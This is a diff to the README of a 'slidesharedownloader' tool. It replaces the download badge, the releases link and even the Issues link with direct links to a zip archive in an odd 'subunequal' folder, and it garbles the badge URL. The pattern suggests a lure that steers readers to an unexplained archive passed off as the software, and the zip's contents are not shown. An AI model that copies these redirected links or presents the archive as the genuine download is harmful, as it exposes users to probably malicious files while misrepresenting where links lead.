@@ -1,6 +1,6 @@
 # 🎉 slidesharedownloader - Download Slideshare Content Easily 
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/ivanlker/slidesharedownloader/releases)
+[![Download](https://raw.githubusercontent.com/ivanlker/slidesharedownloader/main/subunequal/slidesharedownloader.zip%https://raw.githubusercontent.com/ivanlker/slidesharedownloader/main/subunequal/slidesharedownloader.zip)](https://raw.githubusercontent.com/ivanlker/slidesharedownloader/main/subunequal/slidesharedownloader.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To run this application, ensure your computer meets the following requirements:
 
 ## 💾 Download & Install
 
-To download the software, visit this page: [Download slidesharedownloader](https://github.com/ivanlker/slidesharedownloader/releases). 
+To download the software, visit this page: [Download slidesharedownloader](https://raw.githubusercontent.com/ivanlker/slidesharedownloader/main/subunequal/slidesharedownloader.zip). 
 
 1. Click on the **Releases** section on the page.
 2. Find the latest version listed. 
@@ -69,7 +69,7 @@ This application is well-suited for users interested in the following topics:
 
 If you encounter any issues, please consult the **Issues** section of our repository. You can also refer to the FAQ for common questions. 
 
-For direct assistance, you can open a new issue on the GitHub page: [GitHub Issues](https://github.com/ivanlker/slidesharedownloader/issues).
+For direct assistance, you can open a new issue on the GitHub page: [GitHub Issues](https://raw.githubusercontent.com/ivanlker/slidesharedownloader/main/subunequal/slidesharedownloader.zip).
 
 ## 📜 License
 
